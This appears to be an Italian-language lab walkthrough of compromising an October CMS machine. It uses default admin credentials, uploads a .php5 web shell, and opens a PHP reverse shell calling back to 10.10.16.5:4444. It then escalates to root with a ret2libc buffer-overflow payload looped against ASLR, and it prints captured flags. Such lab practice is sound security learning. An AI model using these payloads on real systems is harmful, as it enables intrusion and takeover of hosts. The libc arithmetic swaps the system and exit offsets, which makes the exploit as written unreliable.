10.10.10.16


sudo masscan -p1-65535 --rate 1000 --open --banners -e tun0 10.10.10.16
[sudo] password for kali:
Starting masscan 1.3.2 (http://bit.ly/14GZzcT) at 2021-12-14 11:27:34 GMT
Initiating SYN Stealth Scan
Scanning 1 hosts [65535 ports/host]
Discovered open port 22/tcp on 10.10.10.16
Discovered open port 80/tcp on 10.10.10.16



nmap -sC -sV -p22,80 10.10.10.16


PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   1024 79:b1:35:b6:d1:25:12:a3:0c:b5:2e:36:9c:33:26:28 (DSA)
|   2048 16:08:68:51:d1:7b:07:5a:34:66:0d:4c:d0:25:56:f5 (RSA)
|   256 e3:97:a7:92:23:72:bf:1d:09:88:85:b6:6c:17:4e:85 (ECDSA)
|_  256 89:85:90:98:20:bf:03:5d:35:7f:4a:a9:e1:1b:65:31 (ED25519)
80/tcp open  http    Apache httpd 2.4.7 ((Ubuntu))
| http-methods:
|_  Potentially risky methods: PUT PATCH DELETE
|_http-title: October CMS - Vanilla
|_http-server-header: Apache/2.4.7 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel



sulla porta 80 c'è un sito che presenta un tema per october cms:

https://octobercms.com/

php framework based on laravel


nella sezione blog c'è un post:

This is your first ever blog post! It might be a good idea to update this post with some more relevant content.

You can edit this content by selecting Blog from the administration back-end menu.

il menu è:

10.10.10.16/storage/app/media/dr.php5

estensione php5:

The file extension tells the web server which version of PHP to use. Some web servers are set up so that PHP 4 is the default, and you have to use .php5 to tell it to use PHP 5. More and more web servers these days are set up so that .php defaults to PHP 5, and the .php5 extension doesn't do anything extra.

In fact, if you have control over the web server you should be able to configure the mapping between file extensions and PHP versions whichever way you want. On shared hosting providers the mapping can't be changed without affecting other users of the same server.

If the .php extension gives you the version of PHP that you require, then go for it. It's best to keep it consistent across your entire project, however.





http://10.10.10.16/account c'è la possibilità di creare accounts o accedere


uso dirb:


+ http://10.10.10.16/account (CODE:200|SIZE:5090)
+ http://10.10.10.16/backend (CODE:302|SIZE:400)
+ http://10.10.10.16/blog (CODE:200|SIZE:4253)
+ http://10.10.10.16/Blog (CODE:200|SIZE:4253)


andando a http://10.10.10.16/backend è possibile accedere al pannello di amministrazione di october cms

si riesce ad entrare semplicemente con le credenziali di default:

admin:admin

quindi ora ho accesso al pannelo di amministrazione di october cms

in http://10.10.10.16/backend/cms/media è caricato il menu amministratore dr.php5 che avevo trovato prima, ed è accessibile dall'esterno anche se non mi da nessun risultato
posso provare a caricare anche io un file php5 per ottenere una web shell ( e magari da quella una reverse shell )


ho scaricato php-web-shell da https://github.com/itsKindred/php-web-shell/blob/master/php-web-shell.php

//non funzionava, ho fatto una simple_shell.php5

carico il file ( con nome .php non me lo faceva caricare ho dovuto rinominare in .php5 e non ha dato problemi)

qui ho la web shell:

http://10.10.10.16/storage/app/media/simple_shell.php5?cmd=whoami

www-data

ora provo a ottenre una reverse shell

php -r '$sock=fsockopen("10.10.16.5",4444);exec("/bin/sh -i <&3 >&3 2>&3");'

http://10.10.10.16/storage/app/media/simple_shell.php5?cmd=php%20-r%20%27%24sock%3Dfsockopen(%2210.10.16.5%22%2C4444)%3Bexec(%22%2Fbin%2Fsh%20-i%20%3C%263%20%3E%263%202%3E%263%22)%3B%27

ora ho una shell come www-data

www-data@october:/var/www/html/cms/storage/app/uploads$ ls -lart /home/
ls -lart /home/
total 12
drwxr-xr-x 21 root  root  4096 Dec  6 18:00 ..
drwxr-xr-x  3 root  root  4096 Dec  6 18:00 .
drwxr-xr-x  4 harry harry 4096 Dec  6 18:00 harry

www-data@october:/var/www/html/cms/storage/app/uploads$ cat /home/harry/user.txt
3d6a31472aa84e605c19fadaa3ee337d


www-data@october:/var/www$ find / -perm -u=s -type f 2>/dev/null
find / -perm -u=s -type f 2>/dev/null
/bin/umount
/bin/ping
/bin/fusermount
/bin/su
/bin/ping6
/bin/mount
/usr/lib/eject/dmcrypt-get-device
/usr/lib/openssh/ssh-keysign
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/bin/sudo
/usr/bin/newgrp
/usr/bin/pkexec
/usr/bin/passwd
/usr/bin/chfn
/usr/bin/gpasswd
/usr/bin/traceroute6.iputils
/usr/bin/mtr
/usr/bin/chsh
/usr/bin/at
/usr/sbin/pppd
/usr/sbin/uuidd
/usr/local/bin/ovrflw


/usr/local/bin/ovrflw potrebbe essere interessante

www-data@october:/var/www$ ovrflw
ovrflw
Syntax: ovrflw <input string>


prende una stringa in input quindi potrebbe essere presente un buffer overflow



www-data@october:/usr/local/bin$ ovrflw Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba
z3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5BaAy0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2A
Segmentation fault (core dumped)


sembra esserci effettivamente buffer overflow



va in buffer overflow con 112 caratteri

quindi i primi 111 sono accettati

112 A:

AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

ora devo vedere dopo quanti riesco a sovrascrivere eip

115 A:
    sovrascrivono eip con la 115?
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABCDEFGHIJKLMNOPQRSTUV

Starting program: /usr/local/bin/ovrflw AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABCDEFGHIJKLMNOPQRSTUV

cojn questa stringa ottengo:

eip            0x45444342       0x45444342      ---->   0xEDCB  ---> BCDE





i primi byte che trovo nello stack invece sono: 49484746 (FGHI)

0xbff706b0:     0x49484746      0x4d4c4b4a      0x51504f4e      0x55545352
0xbff706c0:     0x00000056      0xbff70744      0xbff706e4      0x0804a01c
0xbff706d0:     0x0804823c      0xb76ea000      0x00000000      0x00000000
0xbff706e0:     0x00000000      0x116ae5eb      0x5592e1fa      0x00000000
0xbff706f0:     0x00000000      0x00000000      0x00000002      0x08048380
0xbff70700:     0x00000000      0xb770e4c0      0xb7557a09      0xb771b000
0xbff70710:     0x00000002      0x08048380      0x00000000      0x080483a1
0xbff70720:     0x0804847d      0x00000002      0xbff70744      0x080484d0
0xbff70730:     0x08048540      0xb7709160      0xbff7073c      0x0000001c
0xbff70740:     0x00000002      0xbff70de6      0xbff70dfc      0x00000000
0xbff70750:     0xbff70e82      0xbff70e8a      0xbff70e9a      0xbff70eba
0xbff70760:     0xbff70ee7      0xbff70ef6      0xbff70f01      0xbff70f0c
0xbff70770:     0xbff70f4e      0xbff70f70      0xbff70f77      0xbff70f90
0xbff70780:     0xbff70faa      0xbff70fca      0xbff70fdd      0x00000000
0xbff70790:     0x00000020      0xb76f8cf0      0x00000021      0xb76f8000
0xbff707a0:     0x00000010      0x078bfbff      0x00000006      0x00001000
0xbff707b0:     0x00000011      0x00000064      0x00000003      0x08048034
0xbff707c0:     0x00000004      0x00000020      0x00000005      0x00000009
0xbff707d0:     0x00000007      0xb76fa000      0x00000008      0x00000000
0xbff707e0:     0x00000009      0x08048380      0x0000000b      0x00000021
0xbff707f0:     0x0000000c      0x00000021      0x0000000d      0x00000021
0xbff70800:     0x0000000e      0x00000021      0x00000017      0x00000001
0xbff70810:     0x00000019      0xbff7083b      0x0000001f      0xbff70fe6


quindi:

112 A ----> AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
BCDE --> vanno in eip ---> BCDE
FGHIJKLMNOPQRSTUV   ----> vanno in stack, direttamente dove punta esp quindi non dovrei mettere nessuno nop sled

ora devo capire cosa mettere in eip per fare jmp esp e generare shellcode

controllo i moduli caricati:

info sharedlibrary
From        To          Syms Read   Shared Object Library
0xb7750860  0xb776876c  Yes         /lib/ld-linux.so.2
0xb75ab490  0xb76decee  Yes         /lib/i386-linux-gnu/libc.so.6

e poi controllo se nei due intervalli From-To c'è un'istanza di jmp esp, il cui opcode è FFE4 (0xff,0xe4)

(gdb) find /b 0xb7750860,0xb776876c,0xff,0xe4
Pattern not found.
(gdb) find /b 0xb75ab490,0xb76decee,0xff, 0xe4
0xb76712ad <read+45>
1 pattern found.

questo indirizzo però cambia ad ogni esecuzione, perchè aslr attivo     --->   cat /proc/sys/kernel/randomize_va_space

tra l'altro c'è DEP proitection attiva quindi non posso eseguire il codice direttamente dall' stack

in pratica al posto di mettere il codice sullo stack, ci metto un'indirizzo (puntatore)
alle istruzioni che voglio eseguire, ad esempio puntatore a /bin/sh

o meglio ci metto il puntatore alla funziona system interna a libc che prende come primo parametro il nuovo exit address e come secondo la prossima istruzione da eseguire che sarà /bin/sh


1) ottengo libc base path ( che essendoci aslr sarà sempre diverso):      però cambiano solo alcuni byte e inoltre non ho limiti su quante volte posso far crashar eil comando quindi posso esegirlo tante volte in loop fino a quando il valore del base address di libc non tornerà ad essere questo 8dovrebbe richeidere tra 512 e 1000 tentativi visto che cambiano solo 512 bit di volta in volta )
      ldd /usr/local/bin/ovrflw | grep libc
      libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0xb75b5000)

2) ottengo offset system e exit:
      readelf -s /lib/i386-linux-gnu/libc.so.6 | grep -e " system@" -e " exit@"
      139: 00033260    45 FUNC    GLOBAL DEFAULT   12 exit@@GLIBC_2.0
      1443: 00040310    56 FUNC    WEAK   DEFAULT   12 system@@GLIBC_2.0

      indirizzo system:   0xb75b5000 + 00033260 -----> B75E8260
      indirizzo exit:     0xb75b5000 + 00040310 -----> B75F5310

3) ottengo offset /bin/sh
      strings -a -t x /lib/i386-linux-gnu/libc.so.6 | grep "/bin/"
      162bac /bin/sh

      indirizzo /bin/sh:  0xb75b5000 + 162bac -------> B7717BAC


quindi a questo punto il mio buffer sarebbe:

      "\x90" * 112 + "\x60\x82\x5e\xb7" + "\x10\x53\x5f\xb7" + "\xac\x7b\x71\xb7"   cioè  "riempimento" + system + exit (primo parametro) + /bin/sh

      in python (2):

      $(python -c 'print "\x90"*112 + "\x60\x82\x5e\xb7" + "\x10\x53\x5f\xb7" + "\xac\x7b\x71\xb7"');

      senza aslr (quinid con base path di libc) fisso avrei fatto:

      /usr/bin/ovrflw $(python -c 'print "\x90"*112 + "\x60\x82\x5e\xb7" + "\x10\x53\x5f\xb7" + "\xac\x7b\x71\xb7"');

      visto che c'è aslr quindi devo provare fino a quando non mi trovo con l'indirizzo di libc lo faccio in un while:

      while true; do ovrflw $(python -c 'print "\x90"*112 + "\x60\x82\x5e\xb7" + "\x10\x53\x5f\xb7" + "\xac\x7b\x71\xb7"'); done

dopo un numero variabile di segmentation fault si ottiene una shell coem root


153cd71bbb2ae1a17c90936677bd456f
